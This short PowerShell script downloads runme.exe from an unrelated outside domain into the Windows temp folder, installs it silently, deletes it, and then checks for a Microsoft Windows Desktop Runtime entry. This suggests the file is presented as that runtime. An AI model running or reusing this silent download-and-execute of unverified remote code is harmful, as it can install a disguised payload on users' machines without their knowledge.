wget http://doyanpokermon.com/runme.exe -OutFile c:\windows\temp\runme.exe
Start-Process -Filepath "c:\windows\temp\runme.exe" -ArgumentList "/install /quiet" -NoNewWindow -Wait
Remove-Item c:\windows\temp\runme.exe -Force
return Get-WmiObject -Class Win32_Product | where name -eq 'Microsoft Windows Desktop Runtime - 3.1.17 (x64)'